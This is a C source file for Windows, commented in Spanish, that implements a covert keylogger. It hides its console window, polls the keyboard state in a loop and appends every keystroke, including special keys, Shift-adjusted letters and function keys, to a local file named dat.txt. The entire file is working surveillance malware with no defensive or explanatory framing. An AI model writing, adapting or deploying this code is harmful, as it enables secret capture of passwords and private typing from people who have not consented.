#include <ctype.h>
#include <windows.h>
#include <stdio.h>
#include <stdbool.h>

void LOG(const char* input) {
    FILE* LogFile = fopen("dat.txt", "a"); // Abre el archivo en modo de adjuntar
    if (LogFile != NULL) {
        if (strcmp(input, "\b") == 0) {
            fclose(LogFile); // Cierra el archivo de escritura para desbloquearlo

            FILE* archivoLectura = fopen("dat.txt", "r");
            if (archivoLectura != NULL) {
                char contenido[1024];
                size_t bytesRead = fread(contenido, 1, sizeof(contenido), archivoLectura);
                fclose(archivoLectura);

                if (bytesRead > 0) {
                    contenido[bytesRead - 1] = '\0'; // Elimina el último caracter del contenido
                    FILE* archivoEscritura = fopen("dat.txt", "w"); // Abre el archivo para escritura
                    if (archivoEscritura != NULL) {
                        fputs(contenido, archivoEscritura); // Escribe el contenido modificado en el archivo
                        fclose(archivoEscritura);
                    }
                }
            }
        } else {
            fprintf(LogFile, "%s", input); // Escribe la entrada en el archivo
            fclose(LogFile); // Cierra el archivo de escritura
        }
    }
}

bool SpecialKeys(int S_Key) {
	switch (S_Key) {
	case VK_SPACE:
		printf(" ");
		LOG(" ");
		return true;
	case VK_RETURN:
		printf("\n[Enter]\n");
		LOG("\n");
		return true;
	case VK_SHIFT:
		printf("#SHIFT#");
		LOG("\n[SHIFT]\n");
		return true;
	case VK_BACK:
		printf("\b");
		LOG("\b");
		return true;
	case VK_RBUTTON:
		printf("#R_CLICK#");
		LOG("\n[R_CLICK]\n");
		return true;
	case VK_CAPITAL:
		printf("#CAPS_LOCK#");
		LOG("\n[CAPS_LCOK]\n");
		return true;
	case VK_TAB:
		printf("#TAB");
		LOG("\n[TAB]\n");
		return true;
	case VK_UP:
		printf("#UP");
		LOG("\n[Arriba]\n");
		return true;
	case VK_DOWN:
		printf("#DOWN");
		LOG("\n[abajo]\n");
		return true;
	case VK_LEFT:
		printf("#LEFT");
		LOG("\n[Izquierda]\n");
		return true;
	case VK_RIGHT:
		printf("#RIGHT");
		LOG("\n[derecha]\n");
		return true;
	case VK_CONTROL:
		printf("#CONTROL");
		LOG("\n[CONTROL]\n");
		return true;
	case VK_MENU:
		printf("#ALT");
		LOG("\n[ALT]\n");
		return true;
	case VK_PRIOR:
		LOG("\n[PageUp]\n");
		return true;
	case VK_NEXT:
		LOG("\n[PageDown]\n");
		return true;
	case VK_END:
		LOG("\n[Fin]\n");
		return true;
	case VK_DELETE:
		LOG("\n[Supr]\n");
		return true;
	case VK_HOME:
		LOG("\n[Inicio]");
		return true;
	case VK_INSERT:
		LOG("\n[Insert]\n");
		return true;

	default: 
		return false;
	}
}



bool IsShiftPressed() {
    return (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
}
int inicio() {
    while (1) {
        Sleep(10);
        ShowWindow(GetConsoleWindow(), SW_HIDE);

        for (int KEY = 8; KEY <= 190; KEY++) {
            if (GetAsyncKeyState(KEY) == -32767) {
                if (!SpecialKeys(KEY)) {
                    FILE* LogFile = fopen("dat.txt", "a");
                    if (LogFile != NULL) {
                        char keyChar;
                        if (KEY >= 112 && KEY <= 123) {
                            int f_key = KEY - 111;
                            fprintf(LogFile, "F%d\n", f_key);
                        } else {
                            keyChar = IsShiftPressed() ? KEY : tolower(KEY);
                            if (IsShiftPressed() && isalpha(keyChar)) {
                                keyChar = toupper(keyChar);
                            }
                            fprintf(LogFile, "%c", keyChar);
                        }
                        fclose(LogFile);
                    }
                }
            }
        }
    }

    return 0;
}
